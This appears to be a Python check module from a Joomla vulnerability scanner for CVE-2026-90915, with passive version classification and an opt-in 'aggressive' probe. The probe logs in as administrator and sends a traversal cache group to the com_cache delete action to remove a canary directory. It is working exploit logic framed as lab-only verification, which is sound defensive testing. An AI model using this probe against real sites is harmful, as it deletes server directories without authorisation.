from __future__ import annotations

import re
from typing import Any

from ...core.auth import joomla_admin_login
from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.transcript import attach_transcript
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding

CVE_ID = "CVE-2026-90915"
NAME = "Joomla cache purge arbitrary directory deletion"
AFFECTED_RULE = "Joomla 4.0.0-5.4.8 and 6.0.0-6.1.3"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
LOGIN_TOKEN = re.compile(
    r'<input[^>]*type="hidden"[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
    re.IGNORECASE,
)


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("4.0.0") <= parsed < parse_version_required("5.4.9"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.1.4"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("4.0.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def _csrf(html: str) -> str | None:
    match = LOGIN_TOKEN.search(html)
    return match.group(1) if match else None


def parse_command(
    value: str | None,
    aggressive_args: dict[str, Any] | None = None,
) -> tuple[str, str, str, str] | None:
    """Parse '<user>:<password>|<canary_url>|<cache_group>' (legacy).

    Prefer ``--aggressive-arg admin_user= / admin_password= / canary_url= /
    cache_group=``; the pipe format is accepted as a fallback.
    """
    if aggressive_args:
        username = str(aggressive_args.get("admin_user", "")).strip()
        password = str(aggressive_args.get("admin_password", ""))
        canary_url = str(aggressive_args.get("canary_url", "")).strip()
        group = str(aggressive_args.get("cache_group", "")).strip()
        if username and password and canary_url and group:
            return username, password, canary_url, group
    if not value:
        return None
    parts = [part.strip() for part in value.split("|")]
    if len(parts) != 3:
        return None
    credentials, canary_url, group = parts
    if ":" not in credentials:
        return None
    username, password = credentials.split(":", 1)
    if not username or not password or not canary_url or not group:
        return None
    return username, password, canary_url, group


def run_aggressive_probe(
    target_url: str,
    username: str,
    password: str,
    canary_url: str,
    group: str,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    before = sess.get(canary_url, timeout=timeout)
    if is_transport_error(before):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The canary URL could not obtain an HTTP response "
                f"({transport_error_detail(before)})."
            ),
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )
    if before.get("status") != 200:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                f"The canary URL returned HTTP {before.get('status')} before the test. Create a "
                "throw-away directory under the web root and point the canary URL at a file inside it."
            ),
            action="Create a dedicated canary directory and retry; never target a production path.",
            evidence={"canary_url": canary_url, "before_status": before.get("status")},
        )

    login_page = sess.get("/administrator/index.php", timeout=timeout)
    if not joomla_admin_login(sess, base, username, password, timeout=timeout):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="The supplied administrator credentials did not establish a Joomla session.",
            action="Verify the administrator credentials and that the account can access com_cache.",
            evidence={"canary_url": canary_url, "login_status": login_page.get("status")},
        )

    cache_page = sess.get("/administrator/index.php?option=com_cache", timeout=timeout)
    cache_token = _csrf(str(cache_page.get("body", "")))
    if not cache_token:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="The com_cache page did not expose a Joomla CSRF token.",
            action="Verify that the administrator account can access the cache manager.",
            evidence={"canary_url": canary_url, "cache_page_status": cache_page.get("status")},
        )

    delete = sess.post(
        "/administrator/index.php?option=com_cache",
        fields={"cid[]": group, "task": "display.delete", cache_token: "1"},
        timeout=timeout,
    )
    after = sess.get(canary_url, timeout=timeout)
    after_status = after.get("status")
    # The shared login helper owns the POST; recover its status from the
    # session transcript (the login POST is the query-less administrator POST).
    login_status = next(
        (
            entry.get("status")
            for entry in reversed(getattr(sess, "transcript", None) or [])
            if entry.get("method") == "POST"
            and str(entry.get("url", "")).rstrip("/").endswith("/administrator/index.php")
        ),
        200,
    )
    evidence = {
        "canary_url": canary_url,
        "cache_group": group,
        "before_status": before.get("status"),
        "login_status": login_status,
        "cache_page_status": cache_page.get("status"),
        "delete_status": delete.get("status"),
        "after_status": after_status,
    }

    if after_status == 404:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=canary_url,
            detail=(
                "The authenticated cache purge accepted a traversal cache group and deleted the "
                "dedicated canary directory (HTTP 200 before, HTTP 404 after). This confirms "
                "CVE-2026-90915 without touching production paths."
            ),
            action=(
                "Upgrade to Joomla 5.4.9, 6.1.4, or newer; review com_cache access logs and "
                "restore any cache-adjacent directories that were removed."
            ),
            evidence=attach_transcript(evidence, sess),
        )

    if delete.get("status") in {403, 406}:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="The cache purge request was blocked by an edge control.",
            action="Validate from a network path that is not filtered, or confirm the version manually.",
            evidence=evidence,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component="Joomla core",
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=canary_url,
        detail=(
            "The cache purge request did not delete the canary directory. The target is likely "
            "patched, or the traversal group did not resolve to the canary path."
        ),
        action=(
            "Upgrade to Joomla 5.4.9/6.1.4 or newer; verify that the canary path is relative to "
            "the administrator cache directory."
        ),
        evidence=evidence,
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
):
    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation="Upgrade to Joomla 5.4.9, 6.1.4, or newer and review cache-purge access logs.",
    )
    finding.exploit_available = HAS_EXPLOIT
    if not run_exploit_check:
        return finding
    if exploit_mode != "aggressive":
        finding.detail += " This CVE requires aggressive lab-only canary validation."
        return finding
    if finding.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        finding.detail += " Aggressive proof skipped because the Joomla version was not potentially affected."
        return finding
    parsed = parse_command(aggressive_command, aggressive_args)
    if not parsed:
        finding.detail += (
            " Supply --aggressive-arg admin_user=<user> --aggressive-arg admin_password=<password> "
            "--aggressive-arg canary_url=<url> --aggressive-arg cache_group=<group> with a dedicated "
            "canary directory (legacy --aggressive-command '<user>:<password>|<canary_url>|<cache_group>' "
            "still works). No deletion was attempted."
        )
        return finding
    username, password, canary_url, group = parsed
    result = run_aggressive_probe(
        target_url,
        username=username,
        password=password,
        canary_url=canary_url,
        group=group,
        timeout=timeout,
        proxy=proxy,
    )
    result.component_version = finding.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": [">=4.0.0,<5.4.9", ">=6.0.0,<6.1.4"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-90915",
            "https://developer.joomla.org/security-centre/1085-20260905-core-arbitrary-directory-deletion-via-cache-purge-action.html",
        ],
    }
